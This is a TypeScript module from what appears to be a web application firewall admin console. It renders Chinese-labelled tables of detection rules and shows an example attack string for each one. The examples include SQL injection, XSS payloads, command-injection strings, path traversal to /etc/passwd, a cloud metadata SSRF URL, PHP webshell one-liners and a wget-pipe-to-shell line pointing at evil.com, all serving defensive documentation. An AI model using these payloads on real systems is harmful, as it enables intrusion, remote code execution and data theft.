import { apiGet } from "./api.js";
import { siteQuery } from "./sites.js";
import { sanitizeProductText } from "./brand-sanitize.js";
import {
  bindPaginationBar,
  categoryLabel,
  clampPage,
  DEFAULT_PAGE_SIZE,
  esc,
  paginate,
  renderPaginationBar,
} from "./components/ui.js";

export type RuleSummary = {
  id: string;
  name: string;
  category: string;
  severity: string;
  paranoia_level?: number;
  pattern?: string;
  source: string;
};

export type LibInjectionRuleStatus = {
  id: string;
  name: string;
  category: string;
  paranoia_level: number;
  severity: string;
};

export type LibInjectionStatus = {
  enabled: boolean;
  rules: LibInjectionRuleStatus[];
};

export type ModuleConfig = {
  enabled: boolean;
  action: string;
  sensitivity: string;
  disabled_rules?: string[];
};
export type ProtectionModules = { modules: Record<string, ModuleConfig> };

export type RulesInventory = {
  rules: RuleSummary[];
  packs: PackSummary[];
};

export type PackSummary = {
  pack_id: string;
  version: string;
  description?: string;
  enabled: boolean;
  rollout_pct: number;
  rule_count: number;
};

export type CrsVersion = {
  id: string;
  created_at: string;
  note: string;
  pack_count: number;
  rule_count: number;
  crs_version?: string;
};

export type RiskTier = "high" | "medium" | "low";
export type ProtectLevel = 1 | 2 | 3;

export type RuleRow = RuleSummary & {
  risk: RiskTier;
  paranoia_level: number;
  active: boolean;
};

export const RISK_LABEL: Record<RiskTier, string> = { high: "高危", medium: "中危", low: "低危" };
export const PROTECT_LABEL: Record<ProtectLevel, string> = { 1: "低", 2: "中", 3: "高" };
const RISK_RANK: Record<RiskTier, number> = { high: 3, medium: 2, low: 1 };

export const CATEGORY_ORDER = [
  "sqli",
  "xss",
  "rce",
  "path_traversal",
  "ssrf",
  "webshell",
  "protocol",
  "misc",
] as const;

const RULE_HINTS: Record<string, { desc: string; example: string }> = {
  "942100": { desc: "检测参数、Cookie、UA 中的 SQL 注入语法", example: "1' OR '1'='1" },
  "942101": { desc: "检测 URL 路径、文件名中的 SQL 注入", example: "/search/id' OR 1=1--" },
  "941100": { desc: "检测参数、Cookie、UA 中的 XSS 脚本", example: "<script>alert(1)</script>" },
  "941101": { desc: "检测 URL 路径、Referer 中的 XSS", example: "/page/<script>alert(1)</script>" },
  "sql-001": { desc: "UNION SELECT 联合查询注入", example: "1' UNION SELECT 1,2,3--" },
  "sql-002": { desc: "OR 恒真条件绕过", example: "1' OR 1=1--" },
  "sql-003": { desc: "SQL 注释符截断语句", example: "admin'--" },
  "sql-004": { desc: "EXEC / xp_cmdshell 等危险存储过程", example: "'; EXEC xp_cmdshell('dir')--" },
  "xss-001": { desc: "script 标签注入", example: "<script>alert(1)</script>" },
  "xss-002": { desc: "javascript: 伪协议", example: "javascript:alert(1)" },
  "xss-003": { desc: "onerror 等事件处理器", example: "<img src=x onerror=alert(1)>" },
  "xss-004": { desc: "eval 动态执行", example: "eval('alert(1)')" },
  "path-001": { desc: "目录穿越读取敏感文件", example: "../../etc/passwd" },
  "rce-001": { desc: "Shell 命令拼接与管道", example: "; cat /etc/passwd" },
  "932140": { desc: "Windows FOR/IF 批处理命令执行", example: "for /f %i in (*.txt) do cmd /c whoami" },
  "932270": { desc: "Unix Shell 波浪号扩展", example: "file~1" },
  "932271": { desc: "Unix Shell 数字波浪号扩展", example: "~1" },
  "932330": { desc: "Shell 历史命令调用", example: "!-d id" },
  "932200": { desc: "RCE 路径/引号绕过", example: "';id;'" },
  "932205": { desc: "RCE 注释符绕过", example: "#;id" },
  "932206": { desc: "RCE 混合引号绕过", example: "'/bin/sh'" },
  "932207": { desc: "RCE 井号注释绕过", example: "test#;id" },
  "932240": { desc: "Unix 命令注入混淆", example: "a''b''c'id'" },
  "932210": { desc: "SQLite 系统命令执行", example: "; .shell id" },
  "932300": { desc: "SMTP 协议命令注入", example: "EHLO evil.com\\r\\nMAIL FROM:<a@b.com>" },
  "932320": { desc: "POP3 协议命令注入", example: "USER u\\r\\nPASS p\\r\\n|/usr/bin/id" },
  "944210": { desc: "Base64 编码 Magic Bytes（Java 序列化）", example: "rO0ABXNyABNqYXZhLnV0aWwuQXJyYXk=" },
  "944220": { desc: "Java 序列化 Magic Bytes", example: "\\xac\\xed\\x00\\x05sr..." },
  "933210": { desc: "PHP 代码注入", example: "<?php system('id'); ?>" },
  "933220": { desc: "PHP 伪协议执行", example: "php://filter/convert.base64-encode/resource=index.php" },
  "ssrf-001": { desc: "访问内网/本机地址", example: "http://127.0.0.1/admin" },
  "upload-001": { desc: "Webshell 上传特征", example: "<?php eval($_POST[1]); ?>" },
};

export function severityToRisk(sev: string): RiskTier {
  const s = sev.toLowerCase();
  if (s === "critical" || s === "high") return "high";
  if (s === "medium") return "medium";
  return "low";
}

export function maxParanoiaForProtect(protect: ProtectLevel): number {
  return protect === 1 ? 1 : protect === 2 ? 2 : 4;
}

function minRiskRankForProtect(protect: ProtectLevel): number {
  return protect === 1 ? RISK_RANK.high : protect === 2 ? RISK_RANK.medium : RISK_RANK.low;
}

export function ruleAtProtectLevel(rule: RuleRow, protect: ProtectLevel): boolean {
  return (
    rule.paranoia_level <= maxParanoiaForProtect(protect) &&
    RISK_RANK[rule.risk] >= minRiskRankForProtect(protect)
  );
}

export function sensitivityToProtect(s: string): ProtectLevel {
  if (s === "low") return 1;
  if (s === "high") return 3;
  return 2;
}

function moduleForCategory(cat: string, modules: Record<string, ModuleConfig>): ModuleConfig {
  if (modules[cat]) return modules[cat];
  return { enabled: true, action: "block", sensitivity: "medium" };
}

function disabledRuleSet(cfg: ModuleConfig | undefined): Set<string> {
  return new Set(cfg?.disabled_rules ?? []);
}

export function isRuleActiveAtModuleSensitivity(
  r: RuleRow,
  modules: Record<string, ModuleConfig>,
  liEnabled: boolean,
): boolean {
  const cat = normalizeCategory(r.category);
  const mod = moduleForCategory(cat, modules);
  if (!mod.enabled) return false;
  if (disabledRuleSet(mod).has(r.id)) return false;
  if (r.source === "内置核心" && !liEnabled) return false;
  return ruleAtProtectLevel(r, sensitivityToProtect(mod.sensitivity));
}

export function recomputeRuleActive(
  rows: RuleRow[],
  modules: Record<string, ModuleConfig>,
  liEnabled: boolean,
): RuleRow[] {
  return rows.map((r) => ({
    ...r,
    active: isRuleActiveAtModuleSensitivity(r, modules, liEnabled),
  }));
}

function translateRuleName(name: string): string {
  let s = name.trim();
  const pairs: [RegExp, string][] = [
    [/^Detects?\s+/i, "检测"],
    [/^Looking for\s+/i, "检测"],
    [/^Finds?\s+/i, "检测"],
    [/SQL Injection Attack[:\s-]*/gi, "SQL 注入 · "],
    [/blind sqli tests using sleep\(\) or benchmark\(\)/i, "盲注 sleep()/benchmark() 时间延迟"],
    [/basic sql injection[^.]*/i, "常见 SQL 注入（UNION/OR 等）"],
    [/Boolean-based attack/i, "布尔盲注"],
    [/authentication bypass/i, "认证绕过"],
    [/integer overflow/i, "整数溢出"],
    [/MySQL charsett switch/i, "MySQL 字符集切换"],
    [/MSSQL DoS/i, "MSSQL 拒绝服务"],
    [/MongoDB SQL injection/i, "MongoDB 注入操作符"],
    [/Postgres pg_sleep/i, "PostgreSQL pg_sleep 延迟注入"],
    [/waitfor delay/i, "MSSQL WAITFOR DELAY 延迟注入"],
    [/Scientific Notation/i, "MySQL 科学计数法绕过"],
    [/inline comment/i, "MySQL 内联注释 /* */"],
    [/cross.?site scripting/i, "跨站脚本 XSS"],
    [/script tag/i, "script 标签"],
    [/event handler/i, "HTML 事件处理器"],
    [/path traversal/i, "路径穿越"],
    [/command injection/i, "命令注入"],
    [/remote command execution/i, "远程命令执行"],
    [/windows for/i, "Windows FOR/IF 命令"],
    [/unix shell/i, "Unix Shell 表达式"],
    [/smtp command/i, "SMTP 命令注入"],
    [/pop3 command/i, "POP3 命令注入"],
    [/sqlite system command/i, "SQLite 系统命令"],
    [/magic bytes/i, "Magic Bytes 特征"],
    [/base64 encoded/i, "Base64 编码载荷"],
    [/rce bypass/i, "RCE 绕过技巧"],
    [/evasion attempt/i, "注入混淆绕过"],
  ];
  for (const [re, rep] of pairs) s = s.replace(re, rep);
  s = s.replace(/\s+/g, " ").trim();
  if (s.length > 72) s = `${s.slice(0, 69)}…`;
  return s || name;
}

function inferAttackExample(r: Pick<RuleRow, "id" | "name" | "category" | "pattern">): string | null {
  if (RULE_HINTS[r.id]?.example) return RULE_HINTS[r.id].example;
  const n = r.name.toLowerCase();
  const p = (r.pattern ?? "").toLowerCase();
  const cat = r.category;

  if (cat === "sqli" || n.includes("sql") || n.includes("sqli")) {
    if (n.includes("union") || p.includes("union")) return "1' UNION SELECT username,password FROM users--";
    if (n.includes("boolean") || p.includes("\\bor\\b") || p.includes("or[\\s")) return "1' OR '1'='1";
    if (n.includes("sleep") || p.includes("sleep") || p.includes("pg_sleep")) return "1'; SELECT SLEEP(5)--";
    if (n.includes("benchmark") || p.includes("benchmark")) return "1' AND BENCHMARK(1000000,MD5(1))--";
    if (n.includes("bypass") || n.includes("authentication")) return "admin'--";
    if (n.includes("comment") || p.includes("/\\*")) return "1'/**/OR/**/1=1--";
    if (n.includes("overflow") || p.includes("429496729")) return "4294967296";
    return "1' OR 1=1--";
  }
  if (cat === "xss" || n.includes("xss")) {
    if (p.includes("script") || n.includes("script")) return "<script>alert(1)</script>";
    if (p.includes("onerror") || p.includes("on\\w+")) return "<img src=x onerror=alert(1)>";
    if (p.includes("javascript") || n.includes("javascript")) return "javascript:alert(1)";
    if (p.includes("eval")) return "eval('alert(1)')";
    return "<svg onload=alert(1)>";
  }
  if (cat === "rce" || n.includes("command") || n.includes("shell") || n.includes("rce")) {
    if (n.includes("windows") || n.includes("for/") || p.includes("for(?:/")) return "for /f %i in (*.txt) do whoami";
    if (n.includes("pop3") || p.includes("retr") || p.includes("pass")) return "USER u\\r\\nPASS p\\r\\n|id";
    if (n.includes("smtp") || p.includes("ehlo") || p.includes("mail")) return "EHLO x\\r\\nMAIL FROM:<a@b.com>";
    if (n.includes("sqlite") || p.includes(".shell")) return "; .shell cat /etc/passwd";
    if (n.includes("history") || p.includes("!-")) return "!-d whoami";
    if (n.includes("base64") || n.includes("magic bytes")) return "rO0ABXNyABNqYXZhLnV0aWwuQXJyYXk=";
    if (n.includes("java") && n.includes("serial")) return "\\xac\\xed\\x00\\x05sr...";
    if (n.includes("php") || p.includes("php")) return "<?php system('id'); ?>";
    if (n.includes("powershell") || p.includes("powershell")) return "; powershell -c whoami";
    if (n.includes("cmd") || p.includes("cmd\\.exe")) return "& cmd.exe /c whoami";
    if (n.includes("shell expression") || p.includes("~[")) return "file~1";
    if (n.includes("wget") || p.includes("wget")) return "; wget -qO- http://evil.com/x.sh|sh";
    if (n.includes("curl") || p.includes("curl")) return "; curl http://169.254.169.254/";
    if (n.includes("backtick") || p.includes("`")) return "`id`";
    if (p.includes("\\$\\(") || n.includes("subshell")) return "$(whoami)";
    if (n.includes("pipe") || n.includes("拼接")) return "; cat /etc/passwd";
    if (n.includes("bypass") && p.includes("#")) return "x#;id";
    if (n.includes("evasion") || n.includes("bypass")) return "a''|id|''b";
    return rceFallbackExample(r.id);
  }
  if (cat === "path_traversal" || n.includes("traversal") || p.includes("\\.\\.")) return "../../etc/passwd";
  if (cat === "ssrf" || n.includes("ssrf")) return "http://169.254.169.254/latest/meta-data/";
  if (cat === "webshell" || n.includes("webshell")) return "<?php @eval($_POST['cmd']); ?>";
  if (cat === "protocol") return "GET / HTTP/1.1\\r\\nHost: evil.com\\r\\n\\r\\n";
  return null;
}

const RCE_FALLBACK_EXAMPLES = [
  "; id",
  "; cat /etc/passwd",
  "| whoami",
  "&& ls -la",
  "; uname -a",
  "`id`",
  "$(whoami)",
  "; ping -c1 127.0.0.1",
];

function rceFallbackExample(id: string): string {
  let h = 0;
  for (const c of id) h = (h * 31 + c.charCodeAt(0)) >>> 0;
  return RCE_FALLBACK_EXAMPLES[h % RCE_FALLBACK_EXAMPLES.length];
}

function ruleDetectHint(r: Pick<RuleRow, "id" | "name" | "category" | "pattern">): { desc: string; example: string | null } {
  const known = RULE_HINTS[r.id];
  if (known) return known;
  return {
    desc: translateRuleName(r.name),
    example: inferAttackExample(r),
  };
}

export function ruleHintById(
  id: string,
  name?: string,
  category?: string,
): { desc: string; example: string | null } {
  return ruleDetectHint({ id, name: name ?? id, category: category ?? "", pattern: "" });
}

export function renderRuleDescCell(r: RuleRow): string {
  const { desc } = ruleDetectHint(r);
  return `<span class="rule-hint-desc">${esc(desc)}</span>`;
}

export function renderRuleExampleCell(r: RuleRow): string {
  const { example } = ruleDetectHint(r);
  if (!example) return `<span class="muted rule-hint-none">—</span>`;
  return `<code class="rule-hint-ex">${esc(example)}</code>`;
}

export function renderRuleHintCell(r: RuleRow): string {
  const { desc, example } = ruleDetectHint(r);
  const ex = example
    ? `<code class="rule-hint-ex">${esc(example)}</code>`
    : `<span class="muted rule-hint-none">—</span>`;
  return `<div class="rule-hint-cell"><div class="rule-hint-desc">${esc(desc)}</div>${ex}</div>`;
}

export function ruleHintSearchText(r: RuleRow): string {
  const { desc, example } = ruleDetectHint(r);
  return `${desc} ${example ?? ""}`;
}

function coreRuleDisplayName(id: string, raw: string): string {
  const map: Record<string, string> = {
    "942100": "SQL 注入 · 参数/Cookie/UA 核心检测",
    "942101": "SQL 注入 · URL 路径/文件名检测",
    "941100": "XSS · 参数/Cookie/UA 核心检测",
    "941101": "XSS · URL 路径/Referer 检测",
  };
  return map[id] ?? sanitizeProductText(raw);
}

export function mergeRuleRows(crsRules: RuleSummary[], li: LibInjectionStatus): RuleRow[] {
  const byId = new Map<string, RuleRow>();
  for (const r of crsRules) {
    const pl = r.paranoia_level ?? 1;
    byId.set(r.id, {
      ...r,
      paranoia_level: pl,
      risk: severityToRisk(r.severity),
      active: false,
    });
  }
  for (const r of li.rules) {
    byId.set(r.id, {
      id: r.id,
      name: coreRuleDisplayName(r.id, r.name),
      category: r.category,
      severity: r.severity,
      paranoia_level: r.paranoia_level,
      pattern: "",
      source: "内置核心",
      risk: severityToRisk(r.severity),
      active: false,
    });
  }
  return [...byId.values()];
}

export function normalizeCategory(cat: string): string {
  if (CATEGORY_ORDER.includes(cat as (typeof CATEGORY_ORDER)[number])) return cat;
  if (cat === "session" || cat === "ldap") return "misc";
  return "misc";
}

export function riskTag(risk: RiskTier): string {
  return `<span class="risk-tag risk-tag-${risk}">${RISK_LABEL[risk]}</span>`;
}

export function paranoiaTag(pl: number): string {
  const n = Math.max(1, Math.min(4, pl || 1));
  return `<span class="pl-tag pl-tag-${n}" title="Paranoia Level ${n}">PL${n}</span>`;
}

/** 按当前拦截等级展示规则状态（模块总开关由页面顶部提示说明，不在行内标「全局关闭」） */
export function statusTag(
  r: RuleRow,
  modules: Record<string, ModuleConfig>,
  protect?: ProtectLevel,
): string {
  const cat = normalizeCategory(r.category);
  const mod = moduleForCategory(cat, modules);
  if (disabledRuleSet(mod).has(r.id)) return `<span class="risk-tag risk-tag-off">本应用关闭</span>`;
  const included = protect != null ? ruleAtProtectLevel(r, protect) : r.active;
  if (!included) return `<span class="risk-tag risk-tag-off">未纳入</span>`;
  return `<span class="risk-tag risk-tag-block">拦截</span>`;
}

function riskSectionTitle(risk: RiskTier, count: number): string {
  return `<span class="risk-section-tag risk-tag-${risk}">${RISK_LABEL[risk]}</span> <span class="muted">(${count})</span>`;
}

export async function fetchRuleRows(siteId?: string): Promise<{
  allRows: RuleRow[];
  moduleConfigs: Record<string, ModuleConfig>;
  liEnabled: boolean;
}> {
  const modulesUrl = siteId ? `/api/modules${siteQuery(siteId)}` : "/api/modules";
  const [inv, li, modules] = await Promise.all([
    apiGet<RulesInventory>("/api/rules/packs?limit=2000"),
    apiGet<{ config: { enabled: boolean }; status: LibInjectionStatus }>("/api/libinjection/config"),
    apiGet<ProtectionModules>(modulesUrl),
  ]);
  const liEnabled = li.config.enabled;
  const moduleConfigs = modules.modules;
  const allRows = recomputeRuleActive(
    mergeRuleRows(inv.rules || [], { enabled: li.config.enabled, rules: li.status.rules || [] }),
    moduleConfigs,
    liEnabled,
  );
  return { allRows, moduleConfigs, liEnabled };
}

/** @deprecated 使用 fetchRuleRows */
export async function fetchRuleRowsGlobal(): Promise<Awaited<ReturnType<typeof fetchRuleRows>>> {
  return fetchRuleRows();
}

export function rowsForCategory(allRows: RuleRow[], cat: string, filter = ""): RuleRow[] {
  const q = filter.trim().toLowerCase();
  let rows = allRows.filter((r) => normalizeCategory(r.category) === cat);
  if (q) {
    rows = rows.filter(
      (r) =>
        r.id.toLowerCase().includes(q) ||
        r.name.toLowerCase().includes(q) ||
        ruleHintSearchText(r).toLowerCase().includes(q),
    );
  }
  return rows;
}

export type RiskSectionsRenderOpts = {
  category: string;
  protect: ProtectLevel;
  allRows: RuleRow[];
  moduleConfigs: Record<string, ModuleConfig>;
  filter?: string;
  idPrefix?: string;
  pageState: Record<string, { page: number; pageSize: number }>;
  /** 弹窗模式：不渲染空危级分组 */
  hideEmptyTiers?: boolean;
  /** 应用级规则集编辑：显示开关列 */
  editable?: boolean;
  /** 编辑态下本模块已关闭的规则 ID */
  disabledRules?: Set<string>;
  moduleKey?: string;
  liEnabled?: boolean;
  /** 编辑态：抽屉内模块开关（优先于 API 快照） */
  moduleEnabled?: boolean;
};

function pageKey(cat: string, protect: ProtectLevel, risk: RiskTier, prefix: string): string {
  return `${prefix}${cat}-p${protect}-${risk}`;
}

function getPageState(
  pageState: Record<string, { page: number; pageSize: number }>,
  cat: string,
  protect: ProtectLevel,
  risk: RiskTier,
  prefix: string,
) {
  const k = pageKey(cat, protect, risk, prefix);
  if (!pageState[k]) pageState[k] = { page: 1, pageSize: DEFAULT_PAGE_SIZE };
  return pageState[k];
}

function renderRiskBlock(
  opts: RiskSectionsRenderOpts,
  risk: RiskTier,
  rules: RuleRow[],
): string {
  const {
    category,
    protect,
    moduleConfigs,
    idPrefix = "risk-",
    editable,
    disabledRules,
    moduleKey,
  } = opts;
  if (!rules.length) {
    return `<div class="tier-block tier-${risk}"><h4>${riskSectionTitle(risk, 0)}</h4><p class="muted tier-empty">暂无规则</p></div>`;
  }
  const st = getPageState(opts.pageState, category, protect, risk, idPrefix);
  st.page = clampPage(st.page, rules.length, st.pageSize);
  const pageItems = paginate(rules, st.page, st.pageSize);
  const prefix = `${idPrefix}${category}-p${protect}-${risk}`;
  const mod = moduleKey ? moduleConfigs[moduleKey] : moduleForCategory(category, moduleConfigs);
  const offSet = disabledRules ?? disabledRuleSet(mod);
  const rows = pageItems
    .map((r) => {
      const atLevel = ruleAtProtectLevel(r, protect);
      const ruleOff = offSet.has(r.id);
      const appRuleOn = atLevel && !ruleOff;
      const toggleCell = editable
        ? `<td class="col-toggle"><label class="switch switch-sm" title="${atLevel ? "本应用启用/关闭此规则" : "当前灵敏度未纳入，请提高模块灵敏度"}">
            <input type="checkbox" class="rule-set-toggle" data-rule-id="${esc(r.id)}" ${
              appRuleOn ? "checked" : ""
            } ${atLevel ? "" : "disabled"} /><span></span></label></td>`
        : "";
      const statusCell = editable
        ? `<td>${
            ruleOff
              ? `<span class="risk-tag risk-tag-off">已关闭</span>`
              : atLevel
                ? `<span class="risk-tag risk-tag-block">拦截</span>`
                : `<span class="risk-tag risk-tag-off">未纳入</span>`
          }</td>`
        : `<td>${statusTag(r, moduleConfigs, protect)}</td>`;
      const rowClass = appRuleOn ? "" : "muted";
      return `<tr class="${rowClass}">
          <td><code>${esc(r.id)}</code></td>
          <td>${esc(r.name)}</td>
          <td>${riskTag(r.risk)}</td>
          <td class="col-pl">${paranoiaTag(r.paranoia_level)}</td>
          ${toggleCell}
          ${statusCell}
          <td class="rule-desc-col">${renderRuleDescCell(r)}</td>
          <td class="rule-example-col">${renderRuleExampleCell(r)}</td>
        </tr>`;
    })
    .join("");
  const toggleHead = editable ? `<th class="col-toggle">启用</th>` : "";
  const statusHead = `<th class="col-status">状态</th>`;
  return `
      <div class="tier-block tier-${risk}" data-tier-block="${prefix}">
        <h4>${riskSectionTitle(risk, rules.length)}</h4>
        <div class="rule-table-wrap">
        <table class="data-table rule-detail-table${editable ? " rule-detail-table-editable" : ""}">
          <thead><tr>
            <th class="col-id">ID</th>
            <th class="col-name">名称</th>
            <th class="col-risk">危级</th>
            <th class="col-pl">PL</th>
            ${toggleHead}
            ${statusHead}
            <th class="col-desc">检测说明</th>
            <th class="col-example">攻击示例</th>
          </tr></thead>
          <tbody>${rows}</tbody>
        </table>
        </div>
        ${renderPaginationBar(prefix, rules.length, st.page, st.pageSize)}
      </div>`;
}

export function renderRiskSectionsHtml(opts: RiskSectionsRenderOpts): string {
  const { category, protect, allRows, filter = "", hideEmptyTiers = false } = opts;
  if (!allRows.length) return `<div class="ant-empty">暂无规则</div>`;

  const catRows = rowsForCategory(allRows, category, filter).filter((r) => ruleAtProtectLevel(r, protect));
  const risks: RiskTier[] = ["high", "medium", "low"];
  const blocks = risks
    .map((risk) => {
      const rules = catRows.filter((r) => r.risk === risk);
      if (hideEmptyTiers && !rules.length) return "";
      return renderRiskBlock(opts, risk, rules);
    })
    .filter(Boolean);
  return blocks.length ? blocks.join("") : `<div class="ant-empty">暂无规则</div>`;
}

export function bindRiskSectionsPagination(
  root: HTMLElement,
  opts: RiskSectionsRenderOpts,
  onPageChange: () => void,
): void {
  const { category, protect, allRows, filter = "", idPrefix = "risk-" } = opts;
  const catRows = rowsForCategory(allRows, category, filter).filter((r) => ruleAtProtectLevel(r, protect));
  for (const risk of ["high", "medium", "low"] as RiskTier[]) {
    const rules = catRows.filter((r) => r.risk === risk);
    const prefix = `${idPrefix}${category}-p${protect}-${risk}`;
    const block = root.querySelector(`[data-tier-block="${prefix}"]`);
    if (!block) continue;
    const st = getPageState(opts.pageState, category, protect, risk, idPrefix);
    bindPaginationBar(block as HTMLElement, prefix, st, rules.length, (next) => {
      opts.pageState[pageKey(category, protect, risk, idPrefix)] = next;
      onPageChange();
    });
  }
}

export function bindRiskSectionRuleToggles(
  root: HTMLElement,
  opts: RiskSectionsRenderOpts,
  onChange: () => void,
): void {
  if (!opts.editable || !opts.disabledRules) return;
  root.querySelectorAll<HTMLInputElement>(".rule-set-toggle").forEach((inp) => {
    inp.onchange = () => {
      const id = inp.dataset.ruleId!;
      if (inp.checked) opts.disabledRules!.delete(id);
      else opts.disabledRules!.add(id);
      onChange();
    };
  });
}

export function protectLevelHint(category: string, protect: ProtectLevel, editable = false): string {
  const activeN = `${PROTECT_LABEL[protect]} 拦截等级`;
  if (editable) {
    return `${categoryLabel(category)} · 本应用规则集 · 灵敏度 ${activeN} · 关闭的单条规则仅对本应用生效`;
  }
  return `${categoryLabel(category)} · 当前预览 ${activeN} · 发布后生效`;
}
